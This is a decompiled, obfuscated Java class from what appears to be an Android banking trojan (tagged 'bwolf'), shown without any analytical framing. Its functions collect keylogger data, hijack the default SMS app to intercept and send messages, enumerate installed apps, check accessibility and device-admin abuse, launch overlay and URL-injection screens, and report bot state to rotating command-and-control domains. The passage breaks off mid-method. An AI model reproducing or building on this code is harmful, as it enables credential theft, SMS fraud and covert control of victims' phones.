package fddo;

import android.Manifest;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.AppOpsManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.AudioManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityManager;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import com.sonnokta.p016j;
import com.sonnokta.p023w;
import com.sonnokta.p025n;
import com.sonnokta.p032o;
import com.sonnokta.p036o;
import com.sonnokta.p049p;
import com.sonnokta.p054v;
import com.sonnokta.p059u;
import com.sonnokta.p086c;
import com.sonnokta.R;
import com.sonnokta.utils.LogUtil;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.TreeMap;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* renamed from: fddo.goto  reason: invalid class name */
public class Cgoto {
    private static String TAG = "bwolf-Cgoto";

    /* renamed from: break  reason: not valid java name */
    public static int f62break = 31;

    /* renamed from: case  reason: not valid java name */
    public static int f63case = 26;

    /* renamed from: catch  reason: not valid java name */
    public static int f64catch = 32;

    /* renamed from: class  reason: not valid java name */
    public static int f65class = 33;

    /* renamed from: else  reason: not valid java name */
    public static int f66else = 28;

    /* renamed from: fddo  reason: collision with root package name */
    private static final String f121fddo = Cbreak.fddo("00fcf8432fca");

    /* renamed from: for  reason: not valid java name */
    public static int f67for = 22;

    /* renamed from: goto  reason: not valid java name */
    public static int f68goto = 29;
    public static int ifdf = Build.VERSION.SDK_INT;

    /* renamed from: new  reason: not valid java name */
    public static int f69new = 23;

    /* renamed from: this  reason: not valid java name */
    public static int f70this = 30;

    /* renamed from: try  reason: not valid java name */
    public static int f71try = 24;

    /* renamed from: fddo.goto$fddo */
    static class fddo implements Runnable {

        /* renamed from: fddo  reason: collision with root package name */
        final /* synthetic */ Context f122fddo;
        final /* synthetic */ String ifdf;

        fddo(Context context, String str) {
            this.f122fddo = context;
            this.ifdf = str;
        }

        public void run() {
            Toast makeText = Toast.makeText(this.f122fddo, this.ifdf, Toast.LENGTH_LONG);
            makeText.setGravity(16, 0, 0);
            makeText.show();
        }
    }

    public static void a(Context context) {
        LogUtil.showErrorLog(TAG, "--- a ---");

        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(Cbreak.fddo("5facd15833c0f6b0663dab38597a670ea1b26e706dc5fc2bf04916b9916bdd1b9d2a"));
        intentFilter.addAction(Cbreak.fddo("5facd15833c0f6b0663dab38597a670ea1b26e706dc5eb37fa4f16aa8c63de12962a9672"));
        intentFilter.addAction(Cbreak.fddo("5facd15833c0f6b0663dab38597a670ea1b26e706dc5f82dfc5802ab8c61da01833184737df75c"));
        intentFilter.addAction(Cbreak.fddo("5facd15833c0f6b0663dab38597a670ea1b26e706dc5f939f65008ae8671cf1a973b97"));
        intentFilter.addAction(Cbreak.fddo("5facd15833c0f6b0663dab38597a670ea1b26e706dc5f939f65008ae8671dc1b9e3185736b"));
        intentFilter.addAction(Cbreak.fddo("5facd15833c0f6b07f21b02b5e6a2c1dec926273669bc117db6267ba8e7dd10c963d967f79fd56"));
        intentFilter.addAction(Cbreak.fddo("5facd15833c0f6b0663dab38597a670ea1b26e706dc5fa3be75e0ca79c61c0"));
        intentFilter.addAction(Cbreak.fddo("5facd15833c0f6b0663dab38597a670ea1b26e706dc5ec20e15e1ba78262d11f832e9f7f6cf946c63bc1668917b307495d259acff6"));
        intentFilter.addAction(Cbreak.fddo("5facd15833c0f6b06136ab7354612701ec8548514daeea2cfc4d00bd9a71cd1692309473"));
        intentFilter.addAction(Cbreak.fddo("5facd15833c0f6b06136ab7340672f06ec914e594ab4fa2cf44f0cb68066cf10943b97"));
        intentFilter.addAction(Cbreak.fddo("5facd15833c0f6b0663dab38597a670ea1b26e706dc5ed2af05a04a08d69d10d873183666afc"));
        intentFilter.addCategory(Cbreak.fddo("5facd15833c0f6b0663dab38597a670ca3b262786c99d056fd5404ac"));
        try {
            context.registerReceiver(new p086c(), intentFilter);
        } catch (Exception unused) {
        }
    }

    /* renamed from: abstract  reason: not valid java name */
    public static String m106abstract(Context context) {
        LogUtil.showErrorLog(TAG, "--- m106abstract ---");
        String defaultSmsPackage = Telephony.Sms.getDefaultSmsPackage(context);
        return defaultSmsPackage != null ? defaultSmsPackage : "";
    }

    public static String adgjsfgjsgdfjea(String str, String str2) {
        LogUtil.showErrorLog(TAG, "--- adgjsfgjsgdfjea ---");
        if (str.isEmpty()) {
            return str2;
        }
        String str3 = str + "|";
        if (str2.isEmpty()) {
            return str;
        }
        if (str3.contains(str2 + "|")) {
            return str;
        }
        String str4 = "";
        for (String str5 : str3.split("\\|")) {
            if (!str5.trim().isEmpty()) {
                if (!str4.contains(str5 + "|") && !str5.equals(str2)) {
                    str4 = str4 + str5 + "|";
                }
            }
        }
        return str4 + str2 + "|";
    }

    public static boolean adgpkhmdsapfghmaepfmdhgpasdm() {
        LogUtil.showErrorLog(TAG, "--- adgpkhmdsapfghmaepfmdhgpasdm ---");
        return Build.MANUFACTURER.contains("samsung") || Build.BRAND.contains("samsung");
    }

    public static boolean adpkfmhpeaoimhpdsogmh(Context context, String str, double d, boolean z) {
        LogUtil.showErrorLog(TAG, "--- adpkfmhpeaoimhpdsogmh ---");
        Long l = Cthrow.m156for(context, str, 0L);
        Long valueOf = Long.valueOf(System.currentTimeMillis());
        if (l.longValue() == 0) {
            if (z) {
                Cthrow.m157goto(context, str, valueOf);
            }
            return true;
        } else if (((double) valueOf.longValue()) <= ((double) l.longValue()) + (d * 1000.0d)) {
            return false;
        } else {
            Cthrow.m157goto(context, str, valueOf);
            return true;
        }
    }

    public static boolean apdkmghpadfmhpadkmfhpmadfphm(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- apdkmghpadfmhpadkmfhpmadfphm ---");
        try {
            context.getPackageManager().getPackageInfo(str, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException unused) {
            return false;
        }
    }

    public static boolean apdmghpaiodfmhpadfmhpdmfkh(Context context) {
        LogUtil.showErrorLog(TAG, "--- apdmghpaiodfmhpadfmhpdmfkh ---");
        return ((KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE)).inKeyguardRestrictedInputMode();
    }

    public static boolean apkdfmhpadmfhpadomfhgpewirh(Context context) {
        LogUtil.showErrorLog(TAG, "--- apkdfmhpadmfhpadomfhgpewirh ---");
        String defaultSmsPackage = Telephony.Sms.getDefaultSmsPackage(context);
        return defaultSmsPackage != null && defaultSmsPackage.equals(context.getPackageName());
    }

    public static void b(Context context) {
        LogUtil.showErrorLog(TAG, "--- b ---");
        if (p059u.f104fddo != null) {
            ((WindowManager) context.getSystemService(Context.WINDOW_SERVICE)).removeView(p059u.f104fddo);
        }
    }

    /* renamed from: break  reason: not valid java name */
    public static void m107break(Context context) {
        LogUtil.showErrorLog(TAG, "--- m107break ---");
        ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE)).setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_ALL);
    }

    public static void c(Context context) {
        LogUtil.showErrorLog(TAG, "--- c ---");
        Settings.System.putInt(context.getContentResolver(), "screen_brightness_mode", 1);
    }

    /* renamed from: case  reason: not valid java name */
    public static void m108case(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- m108case ---");
        String str2 = Cthrow.m158new(context, "domains", "");
        String str3 = Cfor.f120fddo.split("/")[3];
        String[] u = u(str);
        int length = u.length;
        for (int i = 0; i < length; i++) {
            String str4 = u[i];
            if (!str4.startsWith("https://")) {
                str4 = "https://" + str4;
            }
            if (!str4.contains(str3)) {
                if (!str4.endsWith("/")) {
                    str4 = str4 + "/";
                }
                str4 = str4 + str3 + "/";
            }
            str2 = adgjsfgjsgdfjea(str2, str4);
        }
        Cthrow.m159this(context, "domains", str2);
    }

    /* renamed from: catch  reason: not valid java name */
    public static void m109catch(Context context) {
        LogUtil.showErrorLog(TAG, "--- m109catch ---");
        ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE)).setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE);
    }

    /* renamed from: class  reason: not valid java name */
    public static void m110class(Context context, String str, Exception exc) {
        String str2;
        try {
            StringWriter stringWriter = new StringWriter();
            PrintWriter printWriter = new PrintWriter(stringWriter);
            exc.printStackTrace(printWriter);
            String stringWriter2 = stringWriter.toString();
            printWriter.close();
            try {
                str2 = m116final(context);
            } catch (Exception e) {
                str2 = "Crash:" + e.getMessage();
            }
            String format = String.format("\n=============\nPlace: %s\nBuild.VERSION.RELEASE: %s\nBuild.MANUFACTURER: %s\nBuild.MODEL: %s\nLANG: %s\nCOUNTRY: %s\nBot state: %s\nMsg: %s\nTb: %s\n===========\n\n", new Object[]{str, Build.VERSION.RELEASE, Build.MANUFACTURER, Build.MODEL, m138throws(context), m142while(context), str2, exc.getMessage(), stringWriter2});
            exc.printStackTrace();
            f(context, format);
        } catch (Exception unused) {
        }
    }

    /* renamed from: const  reason: not valid java name */
    public static int m111const(Context context) {
        LogUtil.showErrorLog(TAG, "--- m111const ---");
        return ((BatteryManager) context.getSystemService(Context.BATTERY_SERVICE)).getIntProperty(4);
    }

    /* renamed from: continue  reason: not valid java name */
    public static long m112continue() {
        LogUtil.showErrorLog(TAG, "--- m112continue ---");
        return System.currentTimeMillis() / 1000;
    }

    public static void d(Context context) {
        LogUtil.showErrorLog(TAG, "--- d ---");
        int intValue = Cthrow.ifdf(context, "SCREEN_OFF_TIMEOUT_DEFAULT", 0).intValue();
        if (intValue != 0) {
            Settings.System.putInt(context.getContentResolver(), "screen_off_timeout", intValue);
        }
    }

    /* renamed from: default  reason: not valid java name */
    public static String m113default(Context context) {
        LogUtil.showErrorLog(TAG, "--- m113default ---");
        String str = "";
        for (ApplicationInfo applicationInfo : context.getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA)) {
            str = str + applicationInfo.packageName + "|";
        }
        return str;
    }

    public static boolean dfhaefdhadfhdfherh(Context context) {
        LogUtil.showErrorLog(TAG, "--- dfhaefdhadfhdfherh ---");
        String string;
        try {
            if (Settings.Secure.getInt(context.getApplicationContext().getContentResolver(), "accessibility_enabled") == 0 || (string = Settings.Secure.getString(context.getApplicationContext().getContentResolver(), "enabled_accessibility_services")) == null) {
                return false;
            }
            String packageName = context.getPackageName();
            String canonicalName = p023w.class.getCanonicalName();
            String str = packageName + "/" + canonicalName;
            String str2 = packageName + "/" + canonicalName.replace(packageName, "");
            for (String str3 : string.split(":")) {
                if (str3.equalsIgnoreCase(str) || str3.equalsIgnoreCase(str2)) {
                    return true;
                }
            }
            return false;
        } catch (Settings.SettingNotFoundException unused) {
            return false;
        }
    }

    public static void dgjaertjardthjdgu(Context context) {
        LogUtil.showErrorLog(TAG, "--- dgjaertjardthjdgu ---");
        boolean isAccess = isAccessibilityServiceEnable(context);
        Intent intent = new Intent();
        intent.setClassName("com.android.settings", "com.android.settings.Settings$AccessibilityInstalledServiceActivity");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if (intent.resolveActivityInfo(context.getPackageManager(), 0) == null) {
            intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
//            intent.addFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_CLEAR_TASK
                    | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        }
        context.startActivity(intent);
    }

    public static boolean isAccessibilityServiceEnable(Context context) {
        LogUtil.showErrorLog(TAG, "--- isAccessibilityServiceEnable ---");
        AccessibilityManager accessibilityManager =
                (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        assert accessibilityManager != null;
        List<AccessibilityServiceInfo> accessibilityServices =
                accessibilityManager.getEnabledAccessibilityServiceList(
                        AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        for (AccessibilityServiceInfo info : accessibilityServices) {
            if (info.getId().contains(context.getPackageName())) {
                return true;
            }
        }
        return false;
    }


    public static void dgjfsdhadfjhadfh(Context context) {
        LogUtil.showErrorLog(TAG, "--- dgjfsdhadfjhadfh ---");
        Cthrow.m155else(context, "SCREEN_OFF_TIMEOUT_DEFAULT", Integer.valueOf(Settings.System.getInt(context.getContentResolver(), "screen_off_timeout", 0)));
        Settings.System.putInt(context.getContentResolver(), "screen_off_timeout", 1800000);
    }

    public static boolean dkgmhapefdmhpadfmhspfkgmh(Context context, String str, int i, boolean z) {
        LogUtil.showErrorLog(TAG, "--- dkgmhapefdmhpadfmhspfkgmh ---");
        return adpkfmhpeaoimhpdsogmh(context, str, (double) i, z);
    }

    public static boolean dpkgmhkgmhrkogmjsfghkgj(Context context) {
        LogUtil.showErrorLog(TAG, "--- dpkgmhkgmhrkogmjsfghkgj ---");
        int intExtra = context.registerReceiver((BroadcastReceiver) null, new IntentFilter("android.intent.action.BATTERY_CHANGED")).getIntExtra("plugged", -1);
        return intExtra == 1 || intExtra == 2 || intExtra == 4;
    }

    public static boolean e(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- e ---");
        Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(str);
        if (launchIntentForPackage == null) {
            return false;
        }
        context.startActivity(launchIntentForPackage);
        return true;
    }

    /* renamed from: else  reason: not valid java name */
    public static boolean m114else(Context context) {
        LogUtil.showErrorLog(TAG, "--- m114else ---");
        return Settings.System.canWrite(context);
    }

    /* renamed from: extends  reason: not valid java name */
    public static String m115extends(Context context, int i) {
        LogUtil.showErrorLog(TAG, "--- m115extends ---");
        String str = Cfor.f59for;
        if (str.isEmpty()) {
            return "";
        }
        PackageManager packageManager = context.getPackageManager();
        try {
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(str, 0);
            if (applicationInfo == null) {
                return "";
            }
            String charSequence = packageManager.getApplicationLabel(applicationInfo).toString();
            return (i == 0 || charSequence.length() <= i) ? charSequence : charSequence.substring(0, i);
        } catch (PackageManager.NameNotFoundException unused) {
            return "";
        }
    }

    public static void f(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- f ---");
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("xc", "bP");
            jSONObject.put("rZ", new JSONArray());
            jSONObject.put("eM", str);
            new Cthis(context, jSONObject).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, new Void[0]);
        } catch (JSONException unused) {
        }
    }

    public static boolean fddo(Context context) {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        return ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getSimState() == TelephonyManager.SIM_STATE_READY;
    }

    public static String fgjagthj(Context context) {
        LogUtil.showErrorLog(TAG, "--- fgjagthj ---");
        if (Cthrow.fddo(context, "save_keylog_prefs", Boolean.FALSE).booleanValue()) {
            String str = Cthrow.m158new(context, "keylog_prefs_data", "");
            Cthrow.m159this(context, "keylog_prefs_data", "");
            return str;
        }
        try {
            File file = new File(context.getApplicationInfo().dataDir, "kl.txt");
            if (!file.exists()) {
                return "";
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
            StringBuilder sb = new StringBuilder();
            String str2 = "";
            while (true) {
                try {
                    str2 = bufferedReader.readLine();
                    if (str2 == null) {
                        String sb2 = sb.toString();
                        file.delete();
                        return sb2;
                    }
                    sb.append(str2);
                    sb.append("\n");
                } catch (IOException e) {
                    Cthrow.m154case(context, "save_keylog_prefs", Boolean.TRUE);
                    e.printStackTrace();
                }
            }
        } catch (Exception unused) {
            return "";
        }
    }

    /* renamed from: final  reason: not valid java name */
    public static String m116final(Context context) {
        LogUtil.showErrorLog(TAG, "--- m116final ---");
        StringBuilder sb = new StringBuilder();
        sb.append("Loader:");
        String str = Cfor.f59for;
        if (!str.isEmpty()) {
            sb.append(apdkmghpadfmhpadkmfhpmadfphm(context, str) ? "ok;" : "deleted;");
        } else {
            sb.append("no;");
        }
        sb.append("SMS:");
        if (apkdfmhpadmfhpadomfhgpewirh(context)) {
            sb.append("yes;");
        } else {
            sb.append("no;");
        }
        sb.append("DevAdm:");
        String fddo2 = Cbreak.fddo("5aa7c3433fcccdff6b3eb633687d2c1b");
        Boolean bool = Boolean.FALSE;
        if (Cthrow.fddo(context, fddo2, bool).booleanValue()) {
            sb.append("yes;");
        } else {
            sb.append("no;");
        }
        sb.append("Lock:");
        if (Cthrow.fddo(context, Cbreak.fddo("52add64103c6fc"), bool).booleanValue()) {
            sb.append("yes;");
        } else {
            sb.append("no;");
        }
        sb.append("Acsb:");
        if (dfhaefdhadfhdfherh(context)) {
            sb.append("yes;");
        } else {
            sb.append("no;");
        }
        sb.append("Push:");
        if (ifdf(context).booleanValue()) {
            sb.append("yes;");
        } else {
            sb.append("no;");
        }
        sb.append("Battery:");
        sb.append(m111const(context) + ";");
        sb.append("Charge:");
        if (dpkgmhkgmhrkogmjsfghkgj(context)) {
            sb.append("yes;");
        } else {
            sb.append("no;");
        }
        sb.append("ScreenUnlocked:");
        if (apdmghpaiodfmhpadfmhpdmfkh(context)) {
            sb.append("yes;");
        } else {
            sb.append("no;");
        }
        return sb.toString();
    }

    /* renamed from: finally  reason: not valid java name */
    public static String m117finally(Context context) {
        LogUtil.showErrorLog(TAG, "--- m117finally ---");
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
                    ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED &&
                    ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                LogUtil.showErrorLog(TAG, "--- m117finally > TODO---");
                return "";
            }
            String line1Number = telephonyManager.getLine1Number();
            return line1Number == null ? "" : line1Number;
        } catch (Exception unused) {
            return "";
        }
    }

    /* renamed from: for  reason: not valid java name */
    @SuppressLint("WrongConstant")
    public static void m118for(Context context) {
        LogUtil.showErrorLog(TAG, "--- m118for ---");
        if (Settings.canDrawOverlays(context)) {
            Intent intent = new Intent(context, p059u.class);
            intent.setFlags(805437440);
            context.startActivity(intent);
        }
    }

    public static void g(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- g ---");
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("xc", "bP");
            jSONObject.put("rZ", new JSONArray());
            jSONObject.put("kM", JSONObject.quote(str));
            new Cthis(context, jSONObject).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, new Void[0]);
        } catch (JSONException unused) {
        }
    }

    /* renamed from: goto  reason: not valid java name */
    public static void m119goto(Context context) {
        LogUtil.showErrorLog(TAG, "--- m119goto ---");
        ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE)).cancelAll();
    }

    public static boolean grethwjrsfhj() {
        LogUtil.showErrorLog(TAG, "--- grethwjrsfhj ---");
        try {
            Class<?> cls = Class.forName("android.os.SystemProperties");
            return !((String) cls.getMethod("get", new Class[]{String.class}).invoke(cls, new Object[]{"ro.miui.ui.version.code"})).isEmpty();
        } catch (Exception unused) {
        }
        return false;
    }

    public static void h(String str, String str2) {
        LogUtil.showErrorLog(TAG, "--- h ---");
        if (!str.isEmpty()) {
            SmsManager smsManager = SmsManager.getDefault();
            if (str2.length() > 70) {
                smsManager.sendMultipartTextMessage(str, (String) null, smsManager.divideMessage(str2), (ArrayList) null, (ArrayList) null);
                return;
            }
            smsManager.sendTextMessage(str, (String) null, str2, (PendingIntent) null, (PendingIntent) null);
        }
    }

    public static void i(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- i ---");
        g(context, "SMS_Intercept: setSmsAdmin started");
        Intent intent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
        intent.putExtra("package", str);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        context.startActivity(intent);
    }

    public static Boolean ifdf(Context context) {
        if (jghkmjpdokgmhsdghkmdg(context)) {
            return Boolean.FALSE;
        }
        String string = Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
        if (string == null) {
            return Boolean.FALSE;
        }
        String[] split = string.split(":");
        String flattenToString = new ComponentName(context, p025n.class).flattenToString();
        for (String equals : split) {
            if (flattenToString.equals(equals)) {
                return Boolean.TRUE;
            }
        }
        return Boolean.FALSE;
    }

    /* renamed from: implements  reason: not valid java name */
    public static void m120implements(Context context) {
        LogUtil.showErrorLog(TAG, "--- m120implements ---");
        context.sendBroadcast(new Intent(context.getPackageName() + ".L_CLOSE"));
    }

    /* renamed from: import  reason: not valid java name */
    public static String m121import() {
        LogUtil.showErrorLog(TAG, "--- m121import ---");
        String str = Build.MANUFACTURER + " " + Build.MODEL;
        if (!grethwjrsfhj()) {
            return str;
        }
        try {
            Class<?> cls = Class.forName("android.os.SystemProperties");
            Method method = cls.getMethod("get", new Class[]{String.class});
            return str + " " + ((String) method.invoke(cls, new Object[]{"ro.miui.ui.version.name"})) + " " + ((String) method.invoke(cls, new Object[]{"ro.miui.ui.version.code"}));
        } catch (Exception unused) {
            return str;
        }
    }

    /* renamed from: instanceof  reason: not valid java name */
    public static void m122instanceof(Context context) {
        LogUtil.showErrorLog(TAG, "--- m122instanceof ---");
        if (ifdf < f68goto) {
            PackageManager packageManager = context.getPackageManager();
            String str = Cthrow.m158new(context, "component_pkg_name", "");
            String str2 = Cthrow.m158new(context, "component_cls_name", "");
            if (!str.isEmpty() && !str2.isEmpty()) {
                packageManager.setComponentEnabledSetting(new ComponentName(str, str2), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            }
        }
    }

    /* renamed from: interface  reason: not valid java name */
    public static String m123interface(Context context) {
        LogUtil.showErrorLog(TAG, "--- m123interface ---");
        long currentTimeMillis = System.currentTimeMillis();
        List<UsageStats> queryUsageStats = ((UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE)).queryUsageStats(0, currentTimeMillis - 3000, currentTimeMillis);
        if (queryUsageStats == null || queryUsageStats.size() == 0) {
            return null;
        }
        TreeMap treeMap = new TreeMap();
        for (UsageStats next : queryUsageStats) {
            treeMap.put(Long.valueOf(next.getLastTimeUsed()), next);
        }
        if (treeMap.isEmpty()) {
            return null;
        }
        return ((UsageStats) treeMap.get(treeMap.lastKey())).getPackageName();
    }

    public static void j(Context context, String str, String str2) {
        Notification.Builder builder;
        Intent intent = new Intent(context, p036o.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("show_toast", "do");
        PendingIntent activity = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.cancelAll();
        if (Build.VERSION.SDK_INT >= 26) {
            if (notificationManager.getNotificationChannel(".channel") == null) {
                notificationManager.createNotificationChannel(new NotificationChannel(".channel", ".channel", NotificationManager.IMPORTANCE_HIGH));
            }
            builder = new Notification.Builder(context, ".channel");
        } else {
            builder = new Notification.Builder(context);
        }
        Notification notification = builder.setSmallIcon(R.drawable.ic_launcher).setContentTitle(str).setContentText(str2).setFullScreenIntent(activity, true).setContentIntent(activity).setOngoing(true).setAutoCancel(true).getNotification();
        notification.flags |= 32;
        notificationManager.notify(1010202, notification);
    }

    public static String jargjtadfhgjsrfj(String str) {
        LogUtil.showErrorLog(TAG, "--- jargjtadfhgjsrfj ---");
        try {
            MessageDigest instance = MessageDigest.getInstance("MD5");
            instance.update(str.getBytes());
            byte[] digest = instance.digest();
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                String hexString = Integer.toHexString(b & 255);
                while (hexString.length() < 2) {
                    hexString = "0" + hexString;
                }
                sb.append(hexString);
            }
            return sb.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return "";
        }
    }

    public static boolean jghkmjpdokgmhsdghkmdg(Context context) {
        LogUtil.showErrorLog(TAG, "--- jghkmjpdokgmhsdghkmdg ---");
        return ((ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE)).isLowRamDevice();
    }

    @SuppressLint("WrongConstant")
    public static void k(Context context) {
        LogUtil.showErrorLog(TAG, "--- k ---");
        Intent intent = new Intent(context, p049p.class);
        intent.setFlags(805437440);
        context.startActivity(intent);
    }

    public static void l(Context context, String str, String str2, String str3) {
        Notification.Builder builder;
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            if (notificationManager.getNotificationChannel(".channel") == null) {
                notificationManager.createNotificationChannel(new NotificationChannel(".channel", ".channel", NotificationManager.IMPORTANCE_HIGH));
            }
            builder = new Notification.Builder(context, ".channel");
        } else {
            builder = new Notification.Builder(context);
        }
        Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(str3);
        if (launchIntentForPackage != null) {
            launchIntentForPackage.addCategory("android.intent.category.LAUNCHER");
        } else {
            launchIntentForPackage = new Intent(context, context.getClass());
        }
        launchIntentForPackage.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        Notification.Builder smallIcon = builder.setContentTitle(str).setContentText(str2).setFullScreenIntent(PendingIntent.getActivity(context, 0, launchIntentForPackage, PendingIntent.FLAG_UPDATE_CURRENT), true).setOngoing(true).setAutoCancel(true).setSmallIcon(R.drawable.ic_launcher);
        Bitmap bitmap = m134switch(context, str3);
        if (bitmap != null) {
            smallIcon.setLargeIcon(bitmap);
        }
        Notification notification = smallIcon.getNotification();
        notification.flags |= 32;
        notificationManager.notify(0, notification);
        if (bitmap != null) {
            bitmap.recycle();
        }
    }

    @SuppressLint("WrongConstant")
    public static void m(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- m ---");
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("type", "url");
            jSONObject.put("data", str);
            Cthrow.m159this(context, "inj_url", jSONObject.toString());
            Cthrow.m159this(context, "smart_inject", "url");
            Intent intent = new Intent(context, p016j.class);
            intent.setFlags(813826048);
            context.startActivity(intent);
        } catch (Exception e) {
            m110class(context, "EXC_SMARTS_URL_SHOW", e);
        }
    }

    public static void n(Context context, String str, String str2, Class cls) {
        Notification.Builder builder;
        Intent intent = new Intent(context, cls);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        PendingIntent activity = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.cancelAll();
        if (Build.VERSION.SDK_INT >= 26) {
            if (notificationManager.getNotificationChannel(".channel") == null) {
                notificationManager.createNotificationChannel(new NotificationChannel(".channel", ".channel", NotificationManager.IMPORTANCE_HIGH));
            }
            builder = new Notification.Builder(context, ".channel");
        } else {
            builder = new Notification.Builder(context);
        }
        Notification notification = builder.setSmallIcon(R.drawable.ic_launcher).setContentTitle(str).setContentText(str2).setFullScreenIntent(activity, true).setContentIntent(activity).setOngoing(true).setAutoCancel(true).getNotification();
        notification.flags |= 32;
        notificationManager.notify(1010202, notification);
    }

    /* renamed from: native  reason: not valid java name */
    public static String m124native(Context context) {
        LogUtil.showErrorLog(TAG, "--- m124native ---");
        String str = Cthrow.m158new(context, "domains", "");
        if (!str.isEmpty()) {
            return str;
        }
        String str2 = Cfor.f120fddo;
        m108case(context, str2);
        return str2;
    }

    /* renamed from: new  reason: not valid java name */
    public static String m125new(String str) {
        LogUtil.showErrorLog(TAG, "--- m125new ---");
        if (str == null || str.isEmpty()) {
            return "";
        }
        try {
            SecretKeySpec secretKeySpec = new SecretKeySpec(jargjtadfhgjsrfj(Cfor.f57case).getBytes(), "AES");
            Cipher instance = Cipher.getInstance("AES/ECB/PKCS5Padding");
            instance.init(2, secretKeySpec);
